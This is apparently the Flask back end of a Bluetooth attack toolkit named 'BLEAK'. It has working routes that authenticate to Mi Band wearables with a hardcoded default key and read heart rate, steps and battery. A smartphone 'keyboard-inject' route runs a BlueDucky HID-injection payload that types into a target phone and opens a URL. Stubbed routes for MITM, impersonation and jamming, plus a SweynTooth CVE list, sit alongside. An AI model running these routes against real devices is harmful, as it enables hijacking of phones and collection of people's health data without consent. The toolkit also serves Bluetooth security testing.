    effect = int(data.get("effect", 37))  # 37=jump7, 38=fade7, 44=flash
    speed  = int(data.get("speed", 80))   # 0-255, lower=faster
    if not mac or not char_uuid:
        return jsonify({"error": "MAC and char_uuid required"}), 400
    try:
        from ble_manager import _run_ble_async
        _smartbulb_prescan(2)
        result = _run_ble_async(_write_bulb_effect(mac, char_uuid, effect, speed))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

async def _write_bulb_effect(mac, char_uuid, effect, speed):
    from bleak import BleakClient
    # Magic Light / Zengge effect: BB <effect> <speed> 44
    payload = bytes([0xBB, effect & 0xFF, speed & 0xFF, 0x44])
    async with BleakClient(mac, timeout=15) as client:
        if not client.is_connected:
            return {"success": False, "error": "Connection failed"}
        try:
            await client.write_gatt_char(char_uuid, payload, response=False)
            return {"success": True, "mac": mac, "effect": effect, "speed": speed}
        except Exception as e:
            return {"success": False, "error": str(e)}

@app.route("/api/smartbulb/effects-list", methods=["GET"])
def smartbulb_effects_list():
    """List all Magic Light compatible effects."""
    return jsonify({"effects": [
        {"id": 37, "name": "Jump 7 Colors"},
        {"id": 38, "name": "Fade 7 Colors"},
        {"id": 39, "name": "Cross Fade Red"},
        {"id": 40, "name": "Cross Fade Green"},
        {"id": 41, "name": "Cross Fade Blue"},
        {"id": 42, "name": "Cross Fade Yellow"},
        {"id": 43, "name": "Cross Fade Cyan"},
        {"id": 44, "name": "Cross Fade Magenta"},
        {"id": 45, "name": "Cross Fade White"},
        {"id": 46, "name": "Cross Fade Red/Green"},
        {"id": 47, "name": "Cross Fade Red/Blue"},
        {"id": 48, "name": "Cross Fade Green/Blue"},
        {"id": 49, "name": "Blink 7 Colors"},
        {"id": 50, "name": "Blink Red"},
        {"id": 51, "name": "Blink Green"},
        {"id": 52, "name": "Blink Blue"},
        {"id": 53, "name": "Blink Yellow"},
        {"id": 54, "name": "Blink Cyan"},
        {"id": 55, "name": "Blink Magenta"},
        {"id": 56, "name": "Blink White"},
    ]})

@app.route("/api/smartbulb/magic-light-detect", methods=["POST"])
def smartbulb_magic_light_detect():
    """Detect if device is Magic Light compatible and return control info."""
    data = request.get_json(silent=True) or {}
    mac = (data.get("mac", "") or "").strip().upper()
    if not mac: return jsonify({"error": "MAC required"}), 400
    try:
        from ble_manager import _run_ble_async
        if STATE.discovery_running:
            STATE.discovery_running = False
            time.sleep(0.5)
        _smartbulb_prescan(2)
        result = _run_ble_async(_detect_magic_light(mac))
        return jsonify(result)
    except Exception as e:
        logger.exception("Magic Light detect failed for %s", mac)
        return jsonify({
            "success": False,
            "mac": mac,
            "magic_light_compatible": False,
            "protocol": None,
            "control_char": None,
            "notify_char": None,
            "services": [],
            "error": str(e),
            "hint": "Falha ao conectar via BlueZ. Rode um novo discovery/pre-scan e tente novamente; bulbs com MAC rotativo podem sair do cache."
        }), 200

async def _detect_magic_light(mac):
    from bleak import BleakClient
    ML_SERVICE  = "0000ffd5-0000-1000-8000-00805f9b34fb"
    ML_CONTROL  = "0000ffd9-0000-1000-8000-00805f9b34fb"
    ML_NOTIFY   = "0000ffd4-0000-1000-8000-00805f9b34fb"
    ALT_SERVICES = [
        "0000ff00-0000-1000-8000-00805f9b34fb",  # Common alternative
        "0000ffe0-0000-1000-8000-00805f9b34fb",  # HM-10 / iLink
        "0000fff0-0000-1000-8000-00805f9b34fb",  # Generic LED
    ]
    result = {"success": False, "mac": mac, "magic_light_compatible": False, "protocol": None,
              "control_char": None, "notify_char": None, "services": []}
    try:
        async with BleakClient(mac, timeout=15) as client:
            if not client.is_connected:
                return {**result, "error": "Connection failed"}
            result["success"] = True
            svcs = list(client.services)
            svc_uuids = [s.uuid.lower() for s in svcs]
            # Check for Magic Light primary service
            if ML_SERVICE.lower() in svc_uuids or any(s in svc_uuids for s in ALT_SERVICES):
                result["magic_light_compatible"] = True
                result["protocol"] = "Magic Light / LEDBLE / Zengge"
            for svc in svcs:
                svc_info = {"uuid": svc.uuid, "chars": []}
                for ch in svc.characteristics:
                    props = [p.lower() for p in ch.properties]
                    ch_info = {"uuid": ch.uuid, "properties": props}
                    if ML_CONTROL.lower() in ch.uuid.lower() or "write" in props:
                        ch_info["role"] = "control"
                        if not result["control_char"]:
                            result["control_char"] = ch.uuid
                    if ML_NOTIFY.lower() in ch.uuid.lower() or "notify" in props:
                        ch_info["role"] = "notify"
                        if not result["notify_char"]:
                            result["notify_char"] = ch.uuid
                    svc_info["chars"].append(ch_info)
                result["services"].append(svc_info)
            # Try to read status (0xEF 0x01 0x77 = status request in Magic Light protocol)
            if result["control_char"]:
                try:
                    await client.write_gatt_char(result["control_char"],
                                                 bytes([0xEF, 0x01, 0x77]), response=False)
                    if result["notify_char"]:
                        import asyncio
                        responses = []
                        def _n(s, d): responses.append(bytes(d))
                        await client.start_notify(result["notify_char"], _n)
                        await asyncio.sleep(1.0)
                        await client.stop_notify(result["notify_char"])
                        if responses:
                            result["status_response"] = responses[0].hex()
                            result["magic_light_compatible"] = True
                except Exception:
                    pass
    except Exception as e:
        result["error"] = str(e)
        result["hint"] = "Device nao conectou no pre-scan atual. Se o MAC rotacionou, rode Discovery/Fast Pair novamente e use o MAC novo."
    return result


def _guess_bulb_control(char_uuid, svc_uuid):
    u = char_uuid.lower()
    # Known control UUIDs for various smart light protocols
    known_control = [
        "0000ff01", "0000ff02", "0000ff03", "0000ff04",  # Common generic
        "0000a001", "0000a002",                            # Tuya
        "0000fee7",                                        # Yeelight
        "0000fff1", "0000fff3", "0000fff4",                # MELK / Magic Lantern
        "0000ffd5", "0000ffd9",                            # Magic Light / Zengge / LEDBLE (main control)
        "0000ffd0",                                        # Magic Light notify
        "0000cc02",                                        # CCT bulbs
        "0000ffe9", "0000ffe5",                            # HM-10 / iLink LED
        "0000aaa1", "0000aaa2",                            # Orion / generic RGB
        "0000b001", "0000b002",                            # Sengled BLE
        "00010203",                                        # Evolution Lite / custom
    ]
    return any(k in u for k in known_control)

def _get_bulb_protocol_info(mac):
    fp = STATE.fingerprints.get(mac.upper(), {})
    name = fp.get("name", "").lower()
    brand = fp.get("bulb_brand", "generic")
    # Auto-detect by name
    if "melk" in name or "lantern" in name or "magic" in name:
        brand = "melk"
    elif "tuya" in name or "ty" == name[:2]:
        brand = "tuya"
    protocols = {
        "melk": {"format": "[0x56, R, G, B, 0x00, 0xF0, 0xAA]", "control_svc": "0000fff0",
                 "control_char": "0000fff3", "note": "MELK/Magic Lantern RGB — write to fff3"},
        "tuya": {"format": "[0x00, R, G, B, 0x00, Brightness, 0x00]", "control_svc": "0000a001"},
        "govee": {"format": "[0x33, 0x05, 0x02, R, G, B, 0x00, ...]", "control_svc": "0000fff0"},
        "yeelight": {"format": "Proprietary Xiaomi protocol", "control_svc": "0000fee7"},
        "magic_blue": {"format": "[0x56, R, G, B, 0x00, 0xF0, 0xAA]", "control_svc": "0000ffe5",
                       "control_char": "0000ffe9"},
        "generic": {"format": "[R, G, B, Brightness]", "control_svc": "Unknown"},
    }
    return protocols.get(brand, protocols["generic"])

# ═══ MI BAND ════════════════════════════════════════════════
@app.route("/api/miband/read", methods=["POST"])
def miband_read():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    auth_key = data.get("auth_key", "30313233343536373839404142434445")
    read_hr = data.get("read_hr", True)
    if not mac: return jsonify({"error": "MAC required"}), 400
    result = {"status": "pending"}
    t = threading.Thread(target=_thread_miband_read, args=(mac, auth_key, read_hr, result), daemon=True)
    t.start()
    t.join(timeout=30)
    return jsonify(result)

def _thread_miband_read(mac, auth_key, read_hr, result):
    try:
        data = asyncio.run(_read_miband_async(mac, auth_key, read_hr))
        result.update(data)
        STATE._miband_live_data[mac] = data
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)

async def _read_miband_async(mac, auth_key_hex, read_hr):
    from bleak import BleakClient
    from Crypto.Cipher import AES
    import struct
    UUID_AUTH = "00000009-0000-3512-2118-0009af100700"
    UUID_BATTERY = "00000006-0000-3512-2118-0009af100700"
    UUID_STEPS = "00000007-0000-3512-2118-0009af100700"
    UUID_HR_CTRL = "00002a39-0000-1000-8000-00805f9b34fb"
    UUID_HR_MEAS = "00002a37-0000-1000-8000-00805f9b34fb"
    auth_key = bytes.fromhex(auth_key_hex)
    auth_event = asyncio.Event()
    auth_success = [False]
    random_bytes = [None]
    hr_values = []
    def auth_handler(sender, data):
        if data[:3] == bytes([0x10, 0x01, 0x01]):
            random_bytes[0] = data[3:]
        elif data[:3] == bytes([0x10, 0x03, 0x01]):
            auth_success[0] = True; auth_event.set()
        elif data[:3] == bytes([0x10, 0x03, 0x04]):
            auth_event.set()
    def hr_handler(sender, data):
        if len(data) >= 2: hr_values.append(data[1])
    result_data = {"status": "connecting", "mac": mac}
    async with BleakClient(mac, timeout=15) as client:
        if not client.is_connected:
            return {"status": "error", "error": "Connection failed"}
        await client.start_notify(UUID_AUTH, auth_handler)
        await asyncio.sleep(0.3)
        await client.write_gatt_char(UUID_AUTH, bytes([0x01, 0x08]) + auth_key)
        await asyncio.sleep(1)
        if random_bytes[0]:
            cipher = AES.new(auth_key, AES.MODE_ECB)
            encrypted = cipher.encrypt(random_bytes[0])
            await client.write_gatt_char(UUID_AUTH, bytes([0x03, 0x08]) + encrypted)
            try: await asyncio.wait_for(auth_event.wait(), timeout=5)
            except asyncio.TimeoutError: pass
        if not auth_success[0]:
            return {"status": "error", "error": "Authentication failed — check auth key"}
        result_data["status"] = "authenticated"
        result_data["auth"] = True
        try:
            batt = await client.read_gatt_char(UUID_BATTERY)
            result_data["battery"] = batt[1] if len(batt) > 1 else batt[0]
        except: result_data["battery"] = None
        try:
            steps = await client.read_gatt_char(UUID_STEPS)
            if len(steps) >= 4: result_data["steps"] = struct.unpack("<I", steps[:4])[0]
            result_data["steps_raw"] = steps.hex()
        except: result_data["steps"] = None
        if read_hr:
            try:
                await client.start_notify(UUID_HR_MEAS, hr_handler)
                await client.write_gatt_char(UUID_HR_CTRL, bytes([0x15, 0x01, 0x01]))
                await asyncio.sleep(8)
                await client.write_gatt_char(UUID_HR_CTRL, bytes([0x15, 0x01, 0x00]))
                await client.stop_notify(UUID_HR_MEAS)
                result_data["heart_rate"] = hr_values[-1] if hr_values else None
                result_data["heart_rate_samples"] = hr_values
            except Exception as e:
                result_data["heart_rate"] = None
        result_data["timestamp"] = datetime.now().isoformat()
    return result_data

@app.route("/api/miband/auto-deauth-connect", methods=["POST"])
def miband_auto_deauth():
    return jsonify({"status": "not_implemented"})

@app.route("/api/miband/live-data/<mac>", methods=["GET"])
def miband_live_data(mac):
    return jsonify(STATE._miband_live_data.get(mac.upper(), {}))

@app.route("/api/miband/auth-info", methods=["GET"])
def miband_auth_info():
    return jsonify({"default_key": "30313233343536373839404142434445", "method": "AES-128-ECB",
                     "uuid_auth": "00000009-0000-3512-2118-0009af100700"})

# ═══ ESP32 ══════════════════════════════════════════════════
@app.route("/api/esp32/status", methods=["GET"])
def esp32_status():
    if esp32_bridge:
        st = esp32_bridge.get_status()
        STATE.esp32_connected = bool(st.get("connected"))
        STATE.esp32_port = st.get("port") if STATE.esp32_connected else None
        return jsonify(st)
    return jsonify({"connected": False, "port": None, "available": ESP32_AVAILABLE})

@app.route("/api/esp32/connect", methods=["POST"])
def esp32_connect():
    global esp32_bridge, ESP32_AVAILABLE, ESP32_PORT
    data = request.get_json(silent=True) or {}
    ports = _serial_ports_priority()
    cached_port = ESP32_PORT if ESP32_PORT and os.path.exists(ESP32_PORT) else None
    port = data.get("port", cached_port or (ports[0] if ports else "/dev/ttyUSB0"))
    if esp32_bridge:
        try: esp32_bridge.disconnect()
        except Exception: pass
    esp32_bridge = ESP32Bridge(port)
    result = esp32_bridge.connect()
    STATE.esp32_connected = result.get("success", False)
    STATE.esp32_port = port if STATE.esp32_connected else None
    ESP32_AVAILABLE = bool(result.get("success")) or ESP32_AVAILABLE
    ESP32_PORT = port if result.get("success") else (cached_port or (ports[0] if ports else None))
    return jsonify(result)

@app.route("/api/esp32/cmd", methods=["POST"])
def esp32_cmd():
    global esp32_bridge
    
    data = request.get_json(silent=True) or {}
    cmd = data.get("cmd") or data.get("command", "")
    
    # If already connected, just send command
    if esp32_bridge and esp32_bridge.connected:
        return jsonify(esp32_bridge.send_command(cmd))
    
    ports = _serial_ports_priority()
    errors = []
    
    for port in ports:
        try:
            # Close any existing bridge first
            if esp32_bridge:
                try: esp32_bridge.disconnect()
                except: pass
            
            bridge = ESP32Bridge(port)
            r = bridge.connect(port)
            
            if r.get("success"):
                esp32_bridge = bridge
                STATE.esp32_connected = True
                STATE.esp32_port = port
                # Now send the actual command
                return jsonify(esp32_bridge.send_command(cmd))
            else:
                errors.append(f"{port}: {r.get('error','no response')}")
                try: bridge.disconnect()
                except: pass
        except Exception as e:
            errors.append(f"{port}: {e}")
    
    return jsonify({
        "success": False,
        "error": "ESP32 não conectado",
        "details": errors,
        "ports": ports,
        "help": "1) Feche 'screen' ou 'minicom' se estiver usando a porta. 2) Verifique firmware flashado com AT+VERSION. 3) Reconecte o USB.",
    }), 400

@app.route("/api/esp32/log", methods=["GET"])
def esp32_log():
    if not esp32_bridge:
        return jsonify({"log": []})
    return jsonify({"log": esp32_bridge.get_log()})

@app.route("/api/esp32/test", methods=["POST"])
def esp32_test():
    """Test ESP32 connectivity — try all serial ports, skip JTAG."""
    global esp32_bridge, ESP32_AVAILABLE, ESP32_PORT
    results = []
    ports = _serial_ports_priority()

    # Reuse the already-open bridge first. Opening a second Serial object on the
    # same FT232/USB CDC port can consume/reset the reply and create false
    # "No response" failures while Debug still shows connected.
    if esp32_bridge and esp32_bridge.connected:
        port = getattr(esp32_bridge, "port", ESP32_PORT or "/dev/ttyUSB0")
        ver = esp32_bridge.send_command("AT+VERSION", timeout=3.0)
        st = esp32_bridge.send_command("AT+STATUS", timeout=3.0) if ver.get("success") else {}
        if ver.get("success"):
            ESP32_AVAILABLE = True
            ESP32_PORT = port
            STATE.esp32_connected = True
            STATE.esp32_port = port
            return jsonify({"results": [{"port": port, "connected": True,
                             "firmware": ver.get("response",""),
                             "status": st.get("response","")}],
                            "any_connected": True, "ports": ports})
        try: esp32_bridge.disconnect()
        except Exception: pass
        esp32_bridge = None
        STATE.esp32_connected = False
        STATE.esp32_port = None

    for port in ports:
        try:
            if esp32_bridge:
                try: esp32_bridge.disconnect()
                except Exception: pass
            bridge = ESP32Bridge(port)
            r = bridge.connect(port, quick=True)
            if r.get("success"):
                ver = bridge.send_command("AT+STATUS")
                results.append({"port": port, "connected": True, "firmware": r.get("firmware",""), "status": ver.get("response","")})
                esp32_bridge = bridge
                ESP32_AVAILABLE = True
                ESP32_PORT = port
                STATE.esp32_connected = True
                STATE.esp32_port = port
            else:
                results.append({"port": port, "connected": False, "error": r.get("error","")})
                bridge.disconnect()
        except Exception as e:
            results.append({"port": port, "connected": False, "error": str(e)})
    connected = any(r.get("connected") for r in results)
    if not connected:
        STATE.esp32_connected = False
        STATE.esp32_port = None
    return jsonify({"results": results, "any_connected": connected, "ports": ports})

@app.route("/api/esp32/fix-permissions", methods=["POST"])
def esp32_fix_permissions():
    """Fix serial port permissions (chmod 666). Requires sudo."""
    import glob as _g
    fixed = []
    failed = []
    for _p in _g.glob("/dev/ttyUSB*") + _g.glob("/dev/ttyACM*"):
        try:
            import os as _op
            _op.chmod(_p, 0o666)
            fixed.append(_p)
        except Exception as e:
            failed.append({"port": _p, "error": str(e)})
    return jsonify({"fixed": fixed, "failed": failed,
                    "note": "If failed, run: sudo chmod 666 /dev/ttyUSB* /dev/ttyACM*"})


@app.route("/api/esp32/scan", methods=["POST"])
def esp32_scan():
    if not esp32_bridge or not esp32_bridge.connected: return jsonify({"error": "ESP32 not connected"}), 400
    return jsonify(esp32_bridge.send_command("AT+BLESCAN"))

@app.route("/api/esp32/enum", methods=["POST"])
def esp32_enum():
    if not esp32_bridge or not esp32_bridge.connected: return jsonify({"error": "ESP32 not connected"}), 400
    data = request.get_json(silent=True) or {}
    return jsonify(esp32_bridge.send_command(f"AT+BLEENUM={data.get('mac','')}"))

@app.route("/api/esp32/stop", methods=["POST"])
def esp32_stop():
    if esp32_bridge: esp32_bridge.disconnect(); STATE.esp32_connected = False
    return jsonify({"status": "stopped"})

@app.route("/api/esp32/mitm/traffic", methods=["GET"])
def esp32_mitm_traffic(): return jsonify(STATE._mitm_traffic)

@app.route("/api/esp32/mitm/captured-values", methods=["GET"])
def esp32_mitm_captured(): return jsonify({"captures": STATE._mitm_traffic.get("captures", [])})

@app.route("/api/esp32/mitm/stop", methods=["POST"])
def esp32_mitm_stop(): STATE.mitm_active = False; return jsonify({"status": "stopped"})

@app.route("/api/esp32/mitm/inject", methods=["POST"])
def esp32_mitm_inject(): return jsonify({"status": "not_implemented"})

@app.route("/api/esp32/impersonate", methods=["POST"])
def esp32_impersonate(): return jsonify({"status": "not_implemented"})

@app.route("/api/esp32/impersonate/guided", methods=["POST"])
def esp32_impersonate_guided(): return jsonify({"status": "not_implemented"})

@app.route("/api/esp32/impersonate/saved", methods=["POST"])
def esp32_impersonate_saved(): return jsonify({"status": "not_implemented"})

@app.route("/api/esp32/jammer", methods=["POST"])
def esp32_jammer(): return jsonify({"status": "not_implemented"})

@app.route("/api/esp32/inject-char", methods=["POST"])
def esp32_inject_char(): return jsonify({"status": "not_implemented"})

@app.route("/api/esp32/profile/save", methods=["POST"])
def esp32_profile_save():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    return jsonify({"status": "saved", "mac": mac}) if mac in STATE.fingerprints else (jsonify({"error": "No data"}), 400)

@app.route("/api/esp32/profile/<mac>", methods=["GET"])
def esp32_profile_get(mac):
    fp = STATE.fingerprints.get(mac.upper())
    return jsonify(fp) if fp else (jsonify({"error": "Not found"}), 404)

@app.route("/api/esp32/known-profiles", methods=["GET"])
def esp32_known_profiles(): return jsonify({"profiles": list(STATE.fingerprints.keys())})

@app.route("/api/esp32/wait-available", methods=["POST"])
def esp32_wait_available():
    port = detect_esp32()
    return jsonify({"available": port is not None, "port": port})

# ═══ SMARTPHONE ═════════════════════════════════════════════
@app.route("/api/smartphone/scan", methods=["POST"])
def smartphone_scan():
    phones = [d for d in STATE.discovered_devices if d.get("domain") == "smartphone" or d.get("os_guess")]
    return jsonify({"devices": phones, "count": len(phones)})

@app.route("/api/smartphone/assess", methods=["POST"])
def smartphone_assess():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "").strip().upper()
    fp = STATE.fingerprints.get(mac, {}) or {}
    dev = next((d for d in STATE.discovered_devices
                if d.get("mac", "").upper() == mac), {}) or {}
    vulns = []
    os_guess = (fp.get("os") or dev.get("os_guess") or dev.get("os") or "").lower()
    name = (dev.get("name") or fp.get("name") or "").lower()
    if not os_guess:
        if any(k in name for k in ["iphone", "ipad", "ios"]):
            os_guess = "ios"
        elif any(k in name for k in ["android", "galaxy", "pixel", "xiaomi", "redmi", "motorola", "oneplus"]):
            os_guess = "android"
    if "ios" in os_guess:
        vulns.append({"cve": "CVE-2023-45866", "severity": "HIGH",
                      "description": "HID pairing/injection exposure check for iOS-class devices"})
    if "android" in os_guess:
        vulns.append({"cve": "CVE-2017-0785", "severity": "CRITICAL",
                      "description": "BlueBorne/legacy Android Bluetooth exposure check"})
        vulns.append({"cve": "BLE-HID-JW", "severity": "MEDIUM",
                      "description": "Just Works/HID pairing policy validation"})
    return jsonify({"mac": mac, "os": os_guess or "Unknown",
                    "device": dev, "vulnerabilities": vulns})

@app.route("/api/smartphone/keyboard-inject", methods=["POST"])
def smartphone_keyboard_inject():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "").strip().upper()
    if not mac:
        return jsonify({"error": "MAC required"}), 400
    open_url = bool(data.get("open_url", True))
    url = data.get("url") or "https://www.youtube.com/watch?v=Ckom3gf57Yw"
    payload = (data.get("payload") or "STRING BLEAK BlueDucky PoC").strip()
    if open_url:
        payload = payload + "\nDELAY 500\nGUI r\nDELAY 700\nSTRING " + url + "\nENTER"
    try:
        from bt_classic import run_blueducky
        result = run_blueducky(mac, payload=payload)
        result["open_url"] = open_url
        result["url"] = url if open_url else None
        return jsonify(result)
    except Exception as e:
        return jsonify({"status": "ERROR", "error": str(e), "mac": mac}), 500

@app.route("/api/smartphone/headphone-race", methods=["POST"])
def smartphone_headphone_race(): return jsonify({"status": "not_implemented"})

@app.route("/api/smartphone/rogue-ap", methods=["POST"])
def smartphone_rogue_ap(): return jsonify({"status": "not_implemented"})

# ═══ SMARTWATCH (generic — any wearable) ════════════════════
SMARTWATCH_PROFILES = {
    "mi_band_3": {"model": "Mi Smart Band 3", "vendor": "Xiaomi", "bt_version": "4.2", "auth": "AES-128-ECB",
                  "default_key": "30313233343536373839404142434445",
                  "services": ["0000fee0", "0000fee1", "00001800", "00001801", "0000180d", "0000180a"],
                  "vulnerabilities": ["BLE-001", "BLE-004", "AV-001", "AV-002"]},
    "mi_band_4": {"model": "Mi Smart Band 4", "vendor": "Xiaomi", "bt_version": "5.0", "auth": "AES-128-ECB",
                  "default_key": "30313233343536373839404142434445",
                  "services": ["0000fee0", "0000fee1", "00001800", "00001801", "0000180d", "0000180a"],
                  "vulnerabilities": ["BLE-001", "BLE-004", "AV-001", "AV-002"]},
    "amazfit": {"model": "Amazfit (Generic)", "vendor": "Zepp/Huami", "bt_version": "5.0", "auth": "AES-128",
                "services": ["0000fee0", "00001800", "0000180d"], "vulnerabilities": ["BLE-001", "BLE-007", "BLE-008"]},
    "fitbit": {"model": "Fitbit (Generic)", "vendor": "Google/Fitbit", "bt_version": "4.2/5.0",
               "auth": "Proprietary", "services": ["adabfb00", "00001800"], "vulnerabilities": ["BLE-001", "BLE-007"]},
    "samsung_watch": {"model": "Galaxy Watch", "vendor": "Samsung", "bt_version": "5.0",
                      "auth": "Samsung proprietary", "services": ["00001800", "0000180a", "0000180d"],
                      "vulnerabilities": ["BLE-007", "BLE-008"]},
    "apple_watch": {"model": "Apple Watch", "vendor": "Apple", "bt_version": "5.3",
                    "auth": "Apple proprietary (iCloud pairing)", "services": ["00001800", "0000180a"],
                    "vulnerabilities": ["BLE-007", "CB-PLT-001"]},
    "garmin": {"model": "Garmin (Generic)", "vendor": "Garmin", "bt_version": "5.0",
               "auth": "Garmin Connect pairing", "services": ["00001800", "0000180d", "6a4e2800"],
               "vulnerabilities": ["BLE-001", "BLE-007", "BLE-008"]},
    "huawei_band": {"model": "Huawei Band/Watch", "vendor": "Huawei", "bt_version": "5.0",
                    "auth": "Huawei proprietary", "services": ["00001800", "0000fee7"],
                    "vulnerabilities": ["BLE-001", "BLE-007", "AV-001"]},
    "generic": {"model": "Generic Wearable", "vendor": "Unknown", "bt_version": "4.2+",
                "auth": "Unknown", "services": ["00001800"],
                "vulnerabilities": ["BLE-001", "BLE-002", "BLE-003", "BLE-007", "BLE-008"]},
}

@app.route("/api/smartwatch/profiles", methods=["GET"])
def smartwatch_profiles():
    return jsonify({"profiles": {k: {"model": v["model"], "vendor": v["vendor"]} for k, v in SMARTWATCH_PROFILES.items()}})

@app.route("/api/smartwatch/profile/<model>", methods=["GET"])
def smartwatch_profile(model):
    p = SMARTWATCH_PROFILES.get(model)
    return jsonify(p) if p else (jsonify({"error": "Not found"}), 404)

@app.route("/api/smartwatch/detect", methods=["POST"])
def smartwatch_detect():
    """Auto-detect smartwatch/wearable devices from discovery results."""
    wearables = [d for d in STATE.discovered_devices
                 if d.get("domain") == "wearable"
                 or any(kw in (d.get("name") or "").lower() for kw in
                        ["band", "watch", "fit", "garmin", "polar", "amazfit", "galaxy watch", "huawei"])]
    return jsonify({"devices": wearables, "count": len(wearables)})

@app.route("/api/smartwatch/read", methods=["POST"])
def smartwatch_read():
    """Read data from any smartwatch/wearable. Returns job_id for polling."""
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "").upper()
    auth_key = data.get("auth_key", "")
    if not mac:
        return jsonify({"error": "MAC required"}), 400

    if STATE.discovery_running:
        STATE.discovery_running = False
        try:
            subprocess.run(['bluetoothctl', 'scan', 'off'], capture_output=True, timeout=3)
        except Exception:
            pass

    job_id = f"watch_{int(time.time()*1000)}"
    result = {"mac": mac, "status": "running", "job_id": job_id,
              "started": datetime.now().isoformat()}
    _exploit_jobs[job_id] = result

    def _run():
        # Pre-flight: ensure active HCI adapter is up before connecting
        ready, msg = ensure_hci0_up(result)
        if not ready:
            result.update({"status": "ERROR", "evidence": msg,
                           "suggestion": "sudo hciconfig {} up".format(HCI_IFACE)})
            return
        ensure_bt_service()

        # Register device in BlueZ before exploit (avoids UNREACHABLE)
        import subprocess as _swsp
        _swsp.run(["bluetoothctl", "scan", "on"], capture_output=True, timeout=2)
        time.sleep(3)
        _swsp.run(["bluetoothctl", "scan", "off"], capture_output=True, timeout=2)
        time.sleep(0.5)

        # Try up to 3 times (device may need time after initial connect attempt)
        for attempt in range(1, 4):
            result["attempt"] = attempt
            result["status"] = "running"
            result["details"] = result.get("details","") + f" | Tentativa {attempt}/3"
            run_exploit_async("WATCH-READ", mac, result,
                              **{"auth_key": auth_key} if auth_key else {})
            # If completed successfully, stop retrying
            if result.get("status") in ("COMPLETED", "VULNERABLE", "NOT_VULNERABLE"):
                break
            if result.get("status") == "DISCONNECTED" and attempt < 3:
                time.sleep(3)  # Wait before retry
            else:
                break

        STATE._miband_live_data[mac] = result

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"job_id": job_id, "status": "running", "mac": mac})

@app.route("/api/smartwatch/attack/<attack_id>", methods=["GET"])
def smartwatch_attack_info(attack_id): return jsonify({"attack_id": attack_id, "status": "info_only"})

@app.route("/api/smartwatch/uuid/<uuid>", methods=["GET"])
def smartwatch_uuid(uuid): return jsonify({"uuid": uuid, "name": resolve_uuid(uuid)})

@app.route("/api/smartwatch/demo-guide", methods=["GET"])
def smartwatch_demo_guide():
    return jsonify({"title": "BLEAK Demo Guide", "steps": [
        "1. Discovery BLE", "2. Detect wearables", "3. Read device data", "4. Vuln Scan", "5. Report"]})

# ═══ ATTACK ENGINE (stubs) ══════════════════════════════════
@app.route("/api/attack-engine/run", methods=["POST"])
def attack_run(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/status", methods=["GET"])
def attack_status(): return jsonify({"running": False, "results": STATE.attack_results})
@app.route("/api/attack-engine/full-flow", methods=["POST"])
def attack_full_flow(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/stop-all", methods=["POST"])
def attack_stop_all(): return jsonify({"status": "stopped"})
@app.route("/api/attack-engine/jammer", methods=["POST"])
def attack_jammer(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/impersonate", methods=["POST"])
def attack_impersonate(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/add-target", methods=["POST"])
def attack_add_target():
    data = request.get_json(silent=True) or {}
    return jsonify({"status": "added", "mac": data.get("mac", "")})
@app.route("/api/attack-engine/force-mac-clone", methods=["POST"])
def attack_force_mac_clone(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/mac-status", methods=["GET"])
def attack_mac_status(): return jsonify({"status": "idle"})
@app.route("/api/attack-engine/gatt-status", methods=["GET"])
def attack_gatt_status(): return jsonify({"status": "idle", "esp32": STATE.esp32_connected})
@app.route("/api/attack-engine/scan-active", methods=["POST"])
def attack_scan_active(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/nrf-status", methods=["GET"])
def attack_nrf_status(): return jsonify({"connected": False})
@app.route("/api/attack-engine/nrf-connect", methods=["POST"])
def attack_nrf_connect(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/nrf-impersonate", methods=["POST"])
def attack_nrf_impersonate(): return jsonify({"status": "not_implemented"})
@app.route("/api/attack-engine/correct-sequence", methods=["GET"])
def attack_correct_sequence(): return jsonify({"sequence": ["discovery", "enumeration", "vuln_scan", "report"]})
@app.route("/api/attack-engine/session/<sid>", methods=["GET"])
def attack_session(sid): return jsonify({"session_id": sid, "status": "not_found"})
@app.route("/api/attack-engine/session/<sid>/stop", methods=["POST"])
def attack_session_stop(sid): return jsonify({"status": "stopped", "session_id": sid})

# ═══ STEALTOOTH ═════════════════════════════════════════════
@app.route("/api/stealtooth/check", methods=["POST"])
def stealtooth_check(): return jsonify({"vulnerable": False})
@app.route("/api/stealtooth/result", methods=["GET"])
def stealtooth_result(): return jsonify({"results": []})
@app.route("/api/stealtooth/attack", methods=["POST"])
def stealtooth_attack(): return jsonify({"status": "not_implemented"})
@app.route("/api/stealtooth/report-entry", methods=["GET"])
def stealtooth_report(): return jsonify({"entries": []})

# ═══ SWEYNTOOTH ═════════════════════════════════════════════
SWEYNTOOTH_CVES = [
    {"id": "CVE-2019-19195", "name": "Truncated L2CAP", "severity": "HIGH", "affected": "Dialog, Cypress, NXP"},
    {"id": "CVE-2019-19196", "name": "Zero LTK Install", "severity": "CRITICAL", "affected": "Telink"},
    {"id": "CVE-2019-19193", "name": "Invalid L2CAP Fragment", "severity": "HIGH", "affected": "Microchip"},
    {"id": "CVE-2019-19194", "name": "Key Size Overflow", "severity": "CRITICAL", "affected": "Telink"},
]
@app.route("/api/sweyntooth/scan", methods=["POST"])
def sweyntooth_scan():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    fp = STATE.fingerprints.get(mac.upper(), {})
    vendor = fp.get("vendor", "").lower()
    findings = [c for c in SWEYNTOOTH_CVES if any(v.lower() in vendor for v in c["affected"].split(", "))]
    return jsonify({"mac": mac, "findings": findings})
@app.route("/api/sweyntooth/result", methods=["GET"])
def sweyntooth_result(): return jsonify({"results": []})
@app.route("/api/sweyntooth/cves", methods=["GET"])
def sweyntooth_cves(): return jsonify({"cves": SWEYNTOOTH_CVES})

# ═══ RAGNAR BT ══════════════════════════════════════════════
